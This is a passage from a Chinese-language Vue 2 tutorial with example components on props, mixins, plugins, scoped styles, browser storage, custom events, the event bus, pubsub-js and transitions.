<script>
import schools from "./components/Schools";
export default {
  name: "App",
  components: {schools},
  data() {
    return {
      msg: '小糊涂',
    }
  }, methods: {
    show() {
      let  refs = this.$refs;
      console.log(refs)
      console.log(refs.hello) //真实DOM元素
      console.log(refs.btn) //真实DOM元素
      console.log(refs.school) //School组件的实例对象（vc）
      console.log('this.msg:'+this.msg)
      console.log('refs.hello.innerText:'+refs.hello.innerText)
      console.log('也可以去修改dom的内容但是吧没办法修改vue中的数据')
      refs.hello.innerText = '12312'
      console.log('this.msg:'+this.msg)
      console.log('refs.hello.innerText:'+refs.hello.innerText)
      console.log('获取修改vue组件中的数据')
      refs.school.$data.school=[]
    }
  },
}
</script>
<style scoped></style>
```



### 3.测试



<img src="images/image-20211221211446690.png" alt="image-20211221211446690" style="zoom:80%;" />





### 4.Schools.vue代码



```java
<template>
  <div class="school">
    <h2>学校名称：{{ school.name }}</h2>
    <h2>学校地址：{{ school.address }}</h2>
  </div>
</template>

<script>
export default {
  name: "Schools",
  data() {
    return {
      school: {
        name: '小糊涂大学',
        address: '天府之国',
      }
    }
  }

}
</script>

<style scoped>
.school {
  background-color: skyblue;
}
</style>
```



## 7.5：props配置项



### 1.简介



1. 功能：让组件接收外部传过来的数据

2. 传递数据：```<Demo name="xxx"/>```

3. 接收数据：

   1. 第一种方式（只接收）：```props:['name'] ```

   2. 第二种方式（限制类型）：```props:{name:String}```

   3. 第三种方式（限制类型、限制必要性、指定默认值）：

      ```js
      props:{
      	name:{
      	type:String, //类型
      	required:true, //必要性
      	default:'老王' //默认值
      	}
      }
      ```

> 备注：props是只读的，Vue底层会监测你对props的修改，如果进行了修改，就会发出警告，若业务需求确实需要修改，那么请复制props的内容到data中一份，然后去修改data中的数据。



### 2.案例



#### App.vue



```java
<template>
  <div>
    <student :students="students"></student>
  </div>
</template>

<script>
import student from "./components/student";

export default {
  name: "App",
  components: { student},
  data() {
    return {
      msg: '小糊涂',
      students: [
        {name: 'admin', age: 18, class: '一年级'},
        {name: '张三', age: 18, class: '三年级'},
        {name: '李四', age: 18, class: '三年级'},
        {name: '王五', age: 18, class: '三年级'},
      ]
    }
  }, methods: {},
}
</script>

<style scoped>

</style>
```



#### student.vue



```java
<template>
  <div>
    <h2>学生明细</h2>
    <h3 v-for="item in myStudents" :key="item.name">{{ item.name }},{{ item.age }},{{ item.class }}</h3>
  </div>
</template>

<script>
export default {
  name: "student",
  data(){
    return{
      myStudents: this.students
    }
  }
  /* ,props:[ 'students' ]*/
  ,props:{
    students:Array
  }
/*   ,props:{
     students:{
       type:Array,
       default:new  Array()
     }
   }*/
}
</script>
<style scoped>
</style>
```



### 4.props简写



```java
props: ['title', 'likes', 'isPublished', 'commentIds', 'author']
```



### 5.props限制类型



```java
props: {
  title: String,
  likes: Number,
  isPublished: Boolean,
  commentIds: Array,
  author: Object,
  callback: Function,
  contactsPromise: Promise // or any other constructor
}
```



### 6.其它 props 验证



> 我们可以为组件的 prop 指定验证要求，例如你知道的这些类型。如果有一个需求没有被满足，则 Vue 会在浏览器控制台中警告你。这在开发一个会被别人用到的组件时尤其有帮助。
>
> 为了定制 prop 的验证方式，你可以为 `props` 中的值提供一个带有验证需求的对象，而不是一个字符串数组。例如：



```java
  props: {
    // 基础的类型检查 (`null` 和 `undefined` 会通过任何类型验证)
    propA: Number,
    // 多个可能的类型
    propB: [String, Number],
    // 必填的字符串
    propC: {
      type: String,
      required: true
    },
    // 带有默认值的数字
    propD: {
      type: Number,
      default: 100
    },
    // 带有默认值的对象
    propE: {
      type: Object,
      // 对象或数组默认值必须从一个工厂函数获取
      default: function () {
        return { message: 'hello' }
      }
    },
    // 自定义验证函数
    propF: {
      validator: function (value) {
        // 这个值必须匹配下列字符串中的一个
        return ['success', 'warning', 'danger'].indexOf(value) !== -1
      }
    }
  }
```





### 7.数据发送的写法



```java
<student username1="userName" passWord2="passWord"></student>     //不推荐
<student v-bind:username1="userName" v-bind:passWord1="passWord"></student> //推荐
<student :username1="userName" :passWord2="passWord"></student>//强烈推荐
```



### 8.注意



+ 当 prop 验证失败的时候，(开发环境构建版本的) Vue 将会产生一个控制台的警告。

+ 注意那些 prop 会在一个组件实例创建**之前**进行验证，所以实例的 property (如 `data`、`computed` 等) 在 `default` 或 `validator` 函数中是不可用的。**（这句话的意思是，我们prop中是不可以使用vue其他property的，比如data里面的数据，但是data可以去使用prop的）**
+ props是只读的，Vue底层会监测你对props的修改，如果进行了修改，就会发出警告，若业务需求确实需要修改，那么请复制props的内容到data中一份，然后去修改data中的数据。



## 7.6：mixin混入



### 1.案例



我们开发的时候应该会有一些公共的方法，比如一些通用的方法，等等如图，那么我们可以使用混入`mixin`

<img src="images/image-20211222215432437.png" alt="image-20211222215432437" style="zoom:80%;" />





### 2.mixin简介



混入 (mixin) 提供了一种非常灵活的方式，来分发 Vue 组件中的可复用功能。一个混入对象可以包含任意组件选项。当组件使用混入对象时，所有混入对象的选项将被“混合”进入该组件本身的选项。



简单说：

1. 功能：可以把多个组件共用的配置提取成一个混入对象

2. 使用方式：

   第一步定义混合：

   ```
   {
       data(){....},
       methods:{....}
       ....
   }
   ```

   第二步使用混入：

   ​	全局混入：```Vue.mixin(xxx)```
   ​	局部混入：```mixins:['xxx']	```



### 3.案例(局部混入)



#### mixin.js



在`src`目录下面创建一个mixin.js(名字可以自定义)，写入以下代码



```java
export const show = {
    data() {
       return{
           name: '小糊涂'
       }
    },
    methods: {
        showName() {
            console.log("*******点击了**********")
        }
    }
}
export const hunhe = {
    data() {
        return {
            x: 100,
            y: 200
        }
    },
}

```



#### Schools.vue



```java
<template>
  <div class="school">
    <h2 @click="showName">学校名称：{{ school.name }}</h2>
    <h2>学校地址：{{ school.address }}</h2>
  </div>
</template>

<script>
import {show,hunhe} from '../mixin/mixin'
export default {
  name: "Schools",
  data() {
    return {
      school: {
        name: '小糊涂大学',
        address: '天府之国',
      }
    }
  },mixins:[show,hunhe]

}
</script>

<style scoped>
.school {
  background-color: skyblue;
}
</style>
```



#### student.vue



```java
<template>
  <div>
    <h2 @click="showName">学生明细</h2>
  </div>
</template>

<script>
import {show,hunhe} from '../mixin/mixin'
export default {
    mixins:[show,hunhe]
}
</script>

<style scoped>

</style>
```



#### App.vue



```java
<template>
  <div>
    <schools></schools>
    <student></student>
  </div>
</template>

<script>
import student from "./components/student";
import schools from "./components/Schools";

export default {
  name: "App",
  components: {student, schools},
  data() {
    return {
      msg: '小糊涂',
    }
  }, methods: {},
}
</script>

<style scoped>

</style>
```



#### 测试

<img src="images/image-20211222221159178.png" alt="image-20211222221159178" style="zoom:80%;" />



### 4.案例(全局混入)



[我们根据上一个案例](#3.案例(局部混合))：我们知道了局部混合，那么现在我们修改成全局混合，只需要在`main.js`引入混入即可,然后把其他组件里面的混入删除掉

```java
import Vue from 'vue'
import App from './App.vue'
import {show,hunhe} from './mixin/mixin'
    
Vue.config.productionTip = false
Vue.mixin(show)
Vue.mixin(hunhe)
    
new Vue({
    render: h => h(App),
}).$mount('#app')
```



<img src="images/image-20211222221700637.png" alt="image-20211222221700637" style="zoom:80%;" />





### 5.混入和生命周期



当我们使用了混入时，并且还配置了生命周期，如下：

```java
export const  test = {
    data(){
      return{
          count:0
      }
    },
    mounted(){
        console.log('使用生命周期')
    }
}
```



这个时候就分为了两种情况：

+ 局部混入：每一个使用混入组件都会去调用一次生命周期
+ 全局混入：所有组件都会去调用生命周期



> 请谨慎使用全局混入，因为它会影响每个单独创建的 Vue 实例 (包括第三方组件)。大多数情况下，只应当应用于自定义选项，就像上面示例一样。推荐将其作为[插件](#7.7：插件)发布，以避免重复应用混入。



### 6.混入数据合并策略



我们在使用混入的时候，如果变量名相同的情况下比如：

<img src="images/image-20211222223319984.png" alt="image-20211222223319984" style="zoom:80%;" />



这种的情况下，是以我们的引入方来决定的：

<img src="images/image-20211222223416381.png" alt="image-20211222223416381" style="zoom:80%;" />



混入的策略也是可以修改的，但是不推荐，如有需要查看一下链接：

https://cn.vuejs.org/v2/guide/mixins.html



### 7.混入数据是否可以修改



这里不写代码了，图片替代：

<img src="images/image-20211222224145926.png" alt="image-20211222224145926" style="zoom:80%;" />



**当我们使用混入对数据进行修改，那么当前组件内的数据才会改变。并且不影响其他组件内的数据。**如图所示：

<img src="images/image-20211222224415293.png" alt="image-20211222224415293" style="zoom:80%;" />



## 7.7：插件



### 1.简介



1. 功能：用于增强Vue

2. 本质：包含install方法的一个对象，install的第一个参数是Vue，第二个以后的参数是插件使用者传递的数据。

3. 定义插件：

```java
对象.install = function (Vue, options) {
    // 1. 添加全局过滤器
    Vue.filter(....)

    // 2. 添加全局指令
    Vue.directive(....)

    // 3. 配置全局混入(合)
    Vue.mixin(....)

    // 4. 添加实例方法
    Vue.prototype.$myMethod = function () {...}
    Vue.prototype.$myProperty = xxxx
}
```

4. 使用插件：```Vue.use()```



### 2.案例



#### myPlujns.js



```java
export const obj = {
    install() {
        console.log("==========="+Date.now())
    }
}
```



#### main.js



```java
import Vue from 'vue'
import App from './App.vue'
import {obj} from '@/plujns/myPlujns'

Vue.config.productionTip = false

Vue.use(obj)//应用组件

new Vue({
    render: h => h(App),
}).$mount('#app')

```





#### 测试



启动游览器发现控制台打印输出





### 3.插件传参



#### myPlujns.js



```java
export const obj2 = {
    install(Vue,x,y,z) {
        console.log("==========="+Date.now())
        console.log("==========="+x)
        console.log("==========="+y)
        console.log("==========="+z)
    }
}
```



#### main.js



```java
import Vue from 'vue'
import App from './App.vue'
import {obj,obj2} from '@/plujns/myPlujns'

Vue.config.productionTip = false

Vue.use(obj)//应用组件
Vue.use(obj2,1,2,3)//应用组件

new Vue({
    render: h => h(App),
}).$mount('#app')
```



#### 测试



打开游览器，查看控制台打印



#### 注意



我们插件如果使用传参的话，那么第一个参数就是vue的示例，名字可以自定义





### 4.写一个自己的插件





```java
//当对象只有一个我们这样来写
export default {
	install(Vue,x,y,z){
		console.log(x,y,z)
		//全局过滤器
		Vue.filter('mySlice',function(value){
			return value.slice(0,4)
		})

		//定义全局指令
		Vue.directive('fbind',{
			//指令与元素成功绑定时（一上来）
			bind(element,binding){
				element.value = binding.value
			},
			//指令所在元素被插入页面时
			inserted(element,binding){
				element.focus()
			},
			//指令所在的模板被重新解析时
			update(element,binding){
				element.value = binding.value
			}
		})

		//定义混入
		Vue.mixin({
			data() {
				return {
					x:100,
					y:200
				}
			},
		})

		//给Vue原型上添加一个方法（vm和vc就都能用了）
		Vue.prototype.hello = ()=>{alert('你好啊')}
	}
}
```





## 7.8：scoped(CSS样式)



### 1.简介



1. 作用：让样式在局部生效，防止冲突。
2. 写法：```<style scoped>```



### 2.案例



#### 代码



<img src="images/image-20211222232004075.png" alt="image-20211222232004075" style="zoom:80%;" />



#### 测试

我们发现样式冲突了

<img src="images/image-20211222232030026.png" alt="image-20211222232030026" style="zoom:80%;" />



### 3.注意



+ `scoped`让样式在局部生效，防止冲突。
+ 如果使用less

```java
<style lang="less" scoped>
*{
  background: skyblue;
}
</style>
```



+ 安装less    cmd命令

```java
# Sass
npm install -D sass-loader sass

# Less
npm install -D less-loader less

# Stylus
npm install -D stylus-loader stylus
```



如果安装过后启动失败请降低版本。

```java
npm uninstall less-loader
npm install less-loader@版本 --save 
```





### 4.来个案例



学到这里我们可以看一下项目练习的： [目的](#目的) 到  [TodoList第一次总结](#TodoList第一次总结)



## 7.9：游览器的存储功能



### 1.简介



1. 存储内容大小一般支持5MB左右（不同浏览器可能还不一样）

2. 浏览器端通过 Window.sessionStorage 和 Window.localStorage 属性来实现本地存储机制。

3. 相关API：

   1. ```xxxxxStorage.setItem('key', 'value');```
      	该方法接受一个键和值作为参数，会把键值对添加到存储中，如果键名存在，则更新其对应的值。

   2. ```xxxxxStorage.getItem('person');```

      ​		该方法接受一个键名作为参数，返回键名对应的值。

   3. ```xxxxxStorage.removeItem('key');```

      ​		该方法接受一个键名作为参数，并把该键名从存储中删除。

   4. ``` xxxxxStorage.clear()```

      ​		该方法会清空存储中的所有数据。

4. 备注：

   1. SessionStorage存储的内容会随着浏览器窗口关闭而消失。
   2. LocalStorage存储的内容，需要手动清除才会消失。
   3. ```xxxxxStorage.getItem(xxx)```如果xxx对应的value获取不到，那么getItem的返回值是null。
   4. ```JSON.parse(null)```的结果依然是null。

 

### 2.localStorage





```java
<!DOCTYPE html>
<html>
	<head>
		<meta charset="UTF-8" />
		<title>localStorage</title>
	</head>
	<body>
		<h2>localStorage</h2>
		<button onclick="saveData()">点我保存一个数据</button>
		<button onclick="readData()">点我读取一个数据</button>
		<button onclick="deleteData()">点我删除一个数据</button>
		<button onclick="deleteAllData()">点我清空一个数据</button>

		<script type="text/javascript" >
			let p = {name:'张三',age:18}

			function saveData(){
				localStorage.setItem('msg','hello!!!')
				localStorage.setItem('msg2',666)
				localStorage.setItem('person',JSON.stringify(p))
			}
			function readData(){
				console.log(localStorage.getItem('msg'))
				console.log(localStorage.getItem('msg2'))

				const result = localStorage.getItem('person')
				console.log(JSON.parse(result))

				// console.log(localStorage.getItem('msg3'))
			}
			function deleteData(){
				localStorage.removeItem('msg2')
			}
			function deleteAllData(){
				localStorage.clear()
			}
		</script>
	</body>
</html>
```





### 3.sessionStorage



```java
<!DOCTYPE html>
<html>
	<head>
		<meta charset="UTF-8" />
		<title>sessionStorage</title>
	</head>
	<body>
		<h2>sessionStorage</h2>
		<button onclick="saveData()">点我保存一个数据</button>
		<button onclick="readData()">点我读取一个数据</button>
		<button onclick="deleteData()">点我删除一个数据</button>
		<button onclick="deleteAllData()">点我清空一个数据</button>

		<script type="text/javascript" >
			let p = {name:'张三',age:18}

			function saveData(){
				sessionStorage.setItem('msg','hello!!!')
				sessionStorage.setItem('msg2',666)
				sessionStorage.setItem('person',JSON.stringify(p))
			}
			function readData(){
				console.log(sessionStorage.getItem('msg'))
				console.log(sessionStorage.getItem('msg2'))

				const result = sessionStorage.getItem('person')
				console.log(JSON.parse(result))

				// console.log(sessionStorage.getItem('msg3'))
			}
			function deleteData(){
				sessionStorage.removeItem('msg2')
			}
			function deleteAllData(){
				sessionStorage.clear()
			}
		</script>
	</body>
</html>
```



### 4.来个案例



查看：[TodoList使用游览器本地缓存](#TodoList使用游览器本地缓存)



## 7.10：组件间的自定义事件





### 1.简介



1. 一种组件间通信的方式，适用于：<strong style="color:red">子组件 ===> 父组件</strong>

2. 使用场景：A是父组件，B是子组件，B想给A传数据，那么就要在A中给B绑定自定义事件（<span style="color:red">事件的回调在A中</span>）。



### 2.事先准备的组件

#### student.vue



```java
<template>
  <div>
    <h1>学生明细</h1>
    <h2>学生姓名：{{name}}</h2>
    <h2>学生性别：{{sex}}</h2>
    <h2>当前求和为：{{number}}</h2>
  </div>
</template>
<script>
export default {
  name:'student',
  data() {
    return {
      name:'张三',
      sex:'男',
      number:0
    }
  }
}
</script>
<style scoped>
*{
  background: skyblue;
}
</style>
```



App.vue



```java
<template>
  <div id="root">
    <student ></student>
  </div>
</template>

<script>
import student from "@/components/student";

export default {
  name: "App",
  components: {student},
  data() {
    return {
    }
  },
  methods: {
    test1() {
      console.log("test1")
    },
    test2(obj) {
      console.log("test2", obj)
    },
    test3(obj, obj2, obj3) {
      console.log("test3", obj, obj2, obj3)
    },
    test4(obj, ...params) {
      console.log("test4", obj, params)
    }
  }
}
</script>
<style >
*{
  background: #dddddd;
}
</style>
```





### 3.绑定自定义事件



> 以下代码统一定义在App.vue组件中

#### 第一种



```java
<template>
  <div id="root">
    <student @test1="test1"  v-on:test2="test2"></student>
  </div>
</template>
```



#### 第二种



```java
<template>
  <div id="root">
    <student  ref="test3"></student>
  </div>
</template>
<script>
export default {
  name: "App",
  components: {student},
  data() {
    return {}
  }, methods: {
    test3(obj, obj2, obj3) {
      console.log("test3", obj, obj2, obj3)
    }
  },mounted() {
    this.$refs.test3.$on("test3",this.test3);
  }
}
</script>
```





#### 第三种



```java
<template>
  <div id="root">
    <student  ref="test3"></student>
  </div>
</template>
<script>
export default {
  name: "App",
  components: {student},
  data() {
    return {}
  }
  },mounted() {
   this.$refs.test3.$on("test5", (json) => {
      console.log("test5", json)
    });
  }
}
</script>
```



### 4.触发自定义事件



> 以下代码均在student组件中写



#### 代码



```java
<template>
  <div>
    <h1>学生明细</h1>
    <h2>学生姓名：{{name}}</h2>
    <h2>学生性别：{{sex}}</h2>
    <h2>当前求和为：{{number}}</h2>
    <button @click="test1Btn">触发test1事件</button>
    <button @click="test23Btn">触发test2和test3事件</button>
  </div>
</template>
<script>
export default {
  name:'student',
  data() {
    return {
      name:'张三',
      sex:'男',
      number:0
    }
  },
  methods:{
    test1Btn(){
      this.$emit("test1");
    }
    ,test23Btn(){
      this.$emit("test2","test2的方法调用，我是它的参数");
      this.$emit("test3","test2的方法调用，我是它的参数1","test2的方法调用，我是它的参数2","test2的方法调用，我是它的参数3");
    }
  }
}
</script>
<style scoped>
</style>
```



#### 测试



<img src="images/image-20211227222828784.png" alt="image-20211227222828784" style="zoom:67%;" />



### 5.解绑自定义事件



> 以下代码均在studen组件中编写



#### 代码



```java
<template>
  <div>
    <h1>学生明细</h1>
    <h2>学生姓名：{{name}}</h2>
    <h2>学生性别：{{sex}}</h2>
    <h2>当前求和为：{{number}}</h2>
    <button @click="test1Btn">触发test1事件</button>
    <button @click="test23Btn">触发test2和test3事件</button>
    <button @click="test3Btn">解绑test3和test4事件和test1事件</button>
  </div>
</template>

<script>

export default {
  name:'student',
  data() {
    return {
      name:'张三',
      sex:'男',
      number:0
    }
  },
  methods:{
    test1Btn(){
      this.$emit("test1");
    }
    ,test23Btn(){
      this.$emit("test2","test2的方法调用，我是它的参数");
      this.$emit("test3","test2的方法调用，我是它的参数1","test2的方法调用，我是它的参数2","test2的方法调用，我是它的参数3");
    },
    test3Btn(){
      this.$off("test1")//解绑一个
      this.$off(["test3","test4"])//解绑多个
      this.$off()//解绑了所有
    }

  }
}
</script>

<style scoped>
*{
  background: skyblue;
}
</style>


```





#### 测试



<img src="images/image-20211227223344786.png" alt="image-20211227223344786" style="zoom:80%;" />

### 6.销毁自定义事件



> 以下代码均在student组件的method中

这里生命周期的钩子函数

```java
//完全销毁一个实例。清理它与其它实例的连接，解绑它的全部指令及事件监听器。
    death(){
				this.$destroy() //销毁了当前Student组件的实例，销毁后所有Student实例的自定义事件全都不奏效。
			}
```





### 7.问题





我们在app组件中想这样写

```java
 <student @click="test4"></student>
```

发现vue还是把它作为了自定义事件，我们只需要这样来做

```java
<student @click.native="test4"></student>
```





### 8.总结注意



1. 一种组件间通信的方式，适用于：<strong style="color:red">子组件 ===> 父组件</strong>

2. 使用场景：A是父组件，B是子组件，B想给A传数据，那么就要在A中给B绑定自定义事件（<span style="color:red">事件的回调在A中</span>）。

3. 绑定自定义事件：

   1. 第一种方式，在父组件中：```<Demo @atguigu="test"/>```  或 ```<Demo v-on:atguigu="test"/>```

   2. 第二种方式，在父组件中：

      ```js
      <Demo ref="demo"/>
      ......
      mounted(){
         this.$refs.xxx.$on('atguigu',this.test)
      }
      ```

   3. 若想让自定义事件只能触发一次，可以使用```once```修饰符，或```$once```方法。

4. 触发自定义事件：```this.$emit('atguigu',数据)```		

5. 解绑自定义事件```this.$off('atguigu')```

6. 组件上也可以绑定原生DOM事件，需要使用```native```修饰符。

7. 注意：通过```this.$refs.xxx.$on('atguigu',回调)```绑定自定义事件时，回调<span style="color:red">要么配置在methods中</span>，<span style="color:red">要么用箭头函数</span>，否则this指向会出问题！



### 9.来个案例



查看： [TodoLIst使用自定义事件](#TodoLIst使用自定义事件)





# 八、VUE脚手架(二)



## 8.1：全局事件总线（GlobalEventBus）



### 1.简介



EventBus 又称为事件总线。在Vue中可以使用 EventBus 来作为沟通桥梁的概念，就像是所有组件共用相同的事件中心，可以向该中心注册发送事件或接收事件，所以组件都可以上下平行地通知其他组件，但也就是太方便所以若使用不慎，就会造成难以维护的灾难，因此才需要更完善的**Vuex**作为状态管理中心，将通知的概念上升到共享状态层次。



### 2.需求分析



![1341065-20210710150947579-860580729](images/1341065-20210710150947579-860580729.png)

![1341065-20210710151002512-2071960857](images/1341065-20210710151002512-2071960857.png)

### 3.目标



```java
目标: 实现A向B通信

1. 确定全局事件总线: 将vm对象作为事件总线挂载到vue的原型对象上
	new Vue({
		beforeCreate () {
			Vue.prototype.$bus = this
		}
	})
2. A组件: 调用(分发)事件
	this.$bus.$emit('xxx', data)
3. B组件: 绑定事件监听
	this.$bus.$on('xxx', this.fn)
	
	methods{
		fn (data) {
			
		}
	}
功能: 实现任意组件间通信
4.使用完事件后要解绑事件
    this.$bus.$off('xxx')
```





### 4.案例





#### main.js



```java
import Vue from 'vue'
import App from './App.vue'

Vue.config.productionTip = false

window.x = {a: 1, b: 2}
new Vue({
    render: h => h(App),
    beforeCreate() {
        Vue.prototype.$bus = this
    }
}).$mount('#app')

```



#### Stuedent.vue



```java
<template>
  <div>
    <h1>学生明细</h1>
    <h2>学生姓名：{{name}}</h2>
    <h2>学生性别：{{sex}}</h2>
    <h2>当前求和为：{{number}}</h2>
    <h2>学校名字：{{schoolName}}</h2>
    <button @click="sendSchool">点我一下：把学生名字给组件学校</button>
  </div>
</template>
<script>
export default {
  name:'student',
  data() {
    return {
      name:'张三',
      sex:'男',
      number:0,
      schoolName:''
    }
  },methods:{
    sendSchool() {
      this.$bus.$emit('sendSchool',this.name);
    }
  },mounted() {
    this.$bus.$on("sendStudent",(data)=>{
      this.schoolName =data;
      console.log("学生组件绑定事件",data)
    })
 },beforeDestroy() {
    this.$bus.$off("sendStudent")
  }
}
</script>

<style scoped>
*{
  background: skyblue;
}
</style>
```





#### School.vue



```java
<template>
  <div class="school">
    <h2>学校名称：{{ school.name }}</h2>
    <h2>学校地址：{{ school.address }}</h2>
    <h2>学校学生名字：{{ school.studentName }}</h2>
    <button @click="sendStudent">点我一下：把学校名字给学生组件</button>
  </div>
</template>
<script>
export default {
  name: "Schools",
  data() {
    return {
      school: {
        name: '小糊涂大学',
        address: '天府之国',
        studentName: '',
      }
    }
  }, methods: {
    sendStudent() {
      this.$bus.$emit('sendStudent',this.school.name);
    }
  },
  mounted() {
    console.log(this.$bus)
    this.$bus.$on("sendSchool", (data) => {
      console.log(data)
      this.school.studentName = data
      console.log("学校组件绑定事件", data)
    })
   },beforeDestroy() {
    this.$bus.$off("sendSchool")
  }
}
</script>
<style scoped>
* {
  background: bisque;
}
</style>
```





#### 测试



记得再app.vue里面引用一下

<img src="images/image-20220101190425999.png" alt="image-20220101190425999" style="zoom:80%;" />









### 5.总结



1. 一种组件间通信的方式，适用于<span style="color:red">任意组件间通信</span>。

2. 安装全局事件总线：

   ```js
   new Vue({
   	......
   	beforeCreate() {
   		Vue.prototype.$bus = this //安装全局事件总线，$bus就是当前应用的vm
   	},
       ......
   }) 
   ```

3. 使用事件总线：

   1. 接收数据：A组件想接收数据，则在A组件中给$bus绑定自定义事件，事件的<span style="color:red">回调留在A组件自身。</span>

      ```js
      methods(){
        demo(data){......}
      }
      ......
      mounted() {
        this.$bus.$on('xxxx',this.demo)
      }
      ```

   2. 提供数据：```this.$bus.$emit('xxxx',数据)```

4. 最好在beforeDestroy钩子中，用$off去解绑<span style="color:red">当前组件所用到的</span>事件。



```java
beforeDestroy() {
    this.$bus.$off("xxxx")
  }
```







### 6.来个练习





[TodoList全局时间总线](#TodoList全局时间总线)



### 7.插一句话



这个东西呢？全局消息总线记住比较难，其实就是利用vue的生命周期，在创建vc的时候把vue实例放到全局的Vue.prototype里面





## 8.2：消息订阅发布



### 1.简介



1. 一种组件间通信的方式，适用于<span style="color:red">任意组件间通信</span>。

<img src="images/image-20220101192819533.png" alt="image-20220101192819533" style="zoom:67%;" />

### 2.怎么使用

   

   1. 安装pubsub：```npm i pubsub-js```

   2. 引入: ```import pubsub from 'pubsub-js'```

   3. 接收数据：A组件想接收数据，则在A组件中订阅消息，订阅的<span style="color:red">回调留在A组件自身。</span>

      ```js
      methods(){
        demo(data){......}
      }
      ......
      mounted() {
        this.pid = pubsub.subscribe('xxx',this.demo) //订阅消息
      }
      ```

   4. 提供数据：```pubsub.publish('xxx',数据)```

   5. 最好在beforeDestroy钩子中，用```PubSub.unsubscribe(pid)```去<span style="color:red">取消订阅。</span>



### 3.案例



#### 安装



```java
import pubsub from 'pubsub-js
```





#### student.vue



```java
<template>
  <div>
    <h1>学生明细</h1>
    <h2>学生姓名：{{name}}</h2>
    <h2>学生性别：{{sex}}</h2>
    <h2>当前求和为：{{number}}</h2>
    <h2>学校名字：{{schoolName}}</h2>
    <button @click="sendSchool">点我一下：把学生名字给组件学校</button>
  </div>
</template>

<script>

import pubsub from  'pubsub-js'
export default {
  name:'student',
  data() {
    return {
      name:'张三',
      sex:'男',
      number:0,
      schoolName:''
    }
  },methods:{
    sendSchool() {
      pubsub.publish('sendSchool',this.name,100)
    }
  },mounted() {
    pubsub.subscribe('sendStudent',(msg)=>{
      console.log(msg)
    })
  }
}
</script>
<style scoped>

</style>
```



#### Schools.vue



```java
<template>
  <div class="school">
    <h2>学校名称：{{ school.name }}</h2>
    <h2>学校地址：{{ school.address }}</h2>
    <h2>学校学生名字：{{ school.studentName }}</h2>
    <button @click="sendStudent">点我一下：把学校名字给学生组件</button>
  </div>
</template>

<script>
import pubsub from 'pubsub-js'

export default {
  name: "Schools",
  data() {
    return {
      school: {
        name: '小糊涂大学',
        address: '天府之国',
        studentName: '',
      }
    }
  }, methods: {
    sendStudent() {
      pubsub.publish('sendStudent', this.school.name)
    }
  },
  mounted() {
    pubsub.subscribe('sendSchool', (msg, data) => {
      console.log("收到信息:", msg, data)
    })
  }, beforeDestroy() {
  }

}
</script>
<style scoped>

</style>
```



#### 测试



页面自己点击





### 来个练习



[学完之后看TodoList消息订阅与发布](#TodoList消息订阅与发布)





## 8.3：nextTick



1. 语法：`this.$nextTick(回调函数)`
2. 作用：在下一次 DOM 更新结束后执行其指定的回调。
3. 什么时候用：当改变数据后，要基于更新后的新DOM进行某些操作时，要在nextTick所指定的回调函数中执行。



## 8.4：Vue封装的过度与动画



### 1.简介



1. 作用：在插入、更新或移除 DOM元素时，在合适的时候给元素添加样式类名。

2. 图示：

3. 写法：

   1. 准备好样式：

      - 元素进入的样式：
        1. v-enter：进入的起点
        2. v-enter-active：进入过程中
        3. v-enter-to：进入的终点
      - 元素离开的样式：
        1. v-leave：离开的起点
        2. v-leave-active：离开过程中
        3. v-leave-to：离开的终点

   2. 使用```<transition>```包裹要过度的元素，并配置name属性：

      ```vue
      <transition name="hello">
      	<h1 v-show="isShow">你好啊！</h1>
      </transition>
      ```

   3. 备注：若有多个元素需要过度，则需要使用：```<transition-group>```，且每个元素都要指定```key```值。





### 2.动画效果



#### 动画的CSS3写法



这里面的动画效果的命名格式必须如下：



- 元素进入的样式：
  1. **动画名字-enter**：进入的起点
  2. **动画名字-enter-active**：进入过程中
  3. **动画名字-enter-to**：进入的终点
- 元素离开的样式：
  1. **动画名字-leave**：离开的起点
  2. **动画名字-leave-active**：离开过程中
  3. **动画名字-leave-to**：离开的终点



```java
.hello-enter-active{
  animation: donghuaName 1s linear;
}

.hello-leave-active{
  animation: donghuaName 1s linear reverse;
}
@keyframes donghuaName {
  from{
    transform: translateX(-100%);
  }
  to{
    transform: translateX(0px);
  }
}
```



#### vue动画标签



这里的`name`属性和`appear`都是缺一不可

```java
<transition name="动画名字" appear>
</transition>
```



#### 例子



```java
<template>
<div>

  <button @click="isShow=!isShow">点我消失与隐藏</button>
  <transition name="hello" appear>
    <h1 v-show="isShow">你好啊！</h1>
  </transition>
</div>
</template>

<script>
export default {
  name: "Test",
  data(){
     return{
       isShow:true
     }
  }
}
</script>

<style scoped>
h1{
  background-color: orange;
}

.hello-enter-active{
  animation: donghuaName 1s linear;
}

.hello-leave-active{
  animation: donghuaName 1s linear reverse;
}

@keyframes donghuaName {
  from{
    transform: translateX(-100%);
  }
  to{
    transform: translateX(0px);
  }
}
</style>
```



#### 测试



<img src="images/image-20220106231821958.png" alt="image-20220106231821958" style="zoom:80%;" />

### 3.过度效果



#### 动画的CSS3写法



这里面的动画效果的命名格式必须如下：



- 元素进入的样式：
  1. **动画名字-enter**：进入的起点
  2. **动画名字-enter-active**：进入过程中
  3. **动画名字-enter-to**：进入的终点
- 元素离开的样式：
  1. **动画名字-leave**：离开的起点
  2. **动画名字-leave-active**：离开过程中
  3. **动画名字-leave-to**：离开的终点



```java
<style scoped>
	h1{
		background-color: orange;
	}
	/* 进入的起点、离开的终点 */
	.hello-enter,.hello-leave-to{
		transform: translateX(-100%);
	}
	.hello-enter-active,.hello-leave-active{
		transition: 0.5s linear;
	}
	/* 进入的终点、离开的起点 */
	.hello-enter-to,.hello-leave{
		transform: translateX(0);
	}

</style>
```



#### vue动画标签



这里的`name`属性和`appear`都是缺一不可

```java
	<div>
		<button @click="isShow = !isShow">显示/隐藏</button>
		<transition name="hello" appear>
			<h1 v-show="!isShow" key="1">你好啊！</h1>
		</transition>
	</div>
```



### 4.多个元素同时使用过度或者动画



备注：若有多个元素需要过度，则需要使用：`<transition-group>`，且每个元素都要指定`key`值



```java
	<div>
		<button @click="isShow = !isShow">显示/隐藏</button>
		<transition-group name="hello" appear>
			<h1 v-show="!isShow" key="1">你好啊！</h1>
			<h1 v-show="isShow" key="2">小糊涂！</h1>
		</transition-group>
	</div>
```



### 5.使用第三方的库





#### 简介



我们在开发的时候会使用第三方的动画效果，或者是别人写好的动画效果：

- 元素进入的样式：
  1. **enter-class**：进入的起点
  2. **enter-active-class**：进入过程中
  3. **enter-to-class**：进入的终点
- 元素离开的样式：
  1. **leave-class**：离开的起点
  2. **leave-active-class**：离开过程中
  3. **leave-to-class**：离开的终点



> 使用方式如下：
>
> 1.首先先引入第三方类animated.css
>
> 2.将你所需要动画的标签用包裹起来
>
